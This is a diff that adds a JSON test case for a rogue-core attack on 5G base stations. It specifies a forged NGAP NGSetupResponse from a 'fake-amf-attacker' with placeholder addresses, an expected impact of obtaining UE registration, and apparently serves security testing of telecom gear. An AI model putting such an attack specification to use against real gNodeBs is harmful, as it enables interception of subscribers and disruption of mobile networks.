@@ -1,0 +1,78 @@
+{
+  "protocol": "ngap",
+  "message_name": "NGSetupResponse",
+  "attack_scenario": "Fake AMF access to gNB",
+  "procedure_code": 21,
+  "type_of_message": 1,
+  "criticality": "reject",
+  "test_case": {
+    "transport": {
+      "l2_ethernet": {
+        "dst_mac": "XX:XX:XX:XX:XX:XX",
+        "src_mac": "YY:YY:YY:YY:YY:YY",
+        "ethertype": "0x0800"
+      },
+      "ip": {
+        "src_ip": "192.168.1.100",
+        "dst_ip": "192.168.1.101",
+        "ttl": 64,
+        "dscp_ecn": "0x00"
+      },
+      "sctp": {
+        "src_port": 1234,
+        "dst_port": 5678,
+        "verification_tag": "0xabcd",
+        "initial_tsn": 98765,
+        "chunks": [
+          {
+            "type": "DATA",
+            "ppid": 60,
+            "sid": 0,
+            "ssn": 0,
+            "tsn_abs": 98765,
+            "flags": {
+              "B": 1,
+              "E": 1,
+              "U": 0,
+              "I": 0
+            }
+          }
+        ]
+      }
+    },
+    "ngap": {
+      "fields": [
+        {
+          "id": 1,
+          "value": "fake-amf-attacker"
+        },
+        {
+          "id": 96,
+          "value": {
+            "mcc": "999",
+            "mnc": "70",
+            "amf_region_id": "01",
+            "amf_set_id": "0001",
+            "amf_pointer": "00"
+          }
+        },
+        {
+          "id": 86,
+          "value": 255
+        },
+        {
+          "id": 80,
+          "value": [
+            {
+              "mcc": "999",
+              "mnc": "70",
+              "sst": "01"
+            }
+          ]
+        }
+      ]
+    },
+    "crafting_instructions": "Emulate AMF connect to real gNodeB",
+    "expected_impact": "Successfully obtain UE registration"
+  }
+}
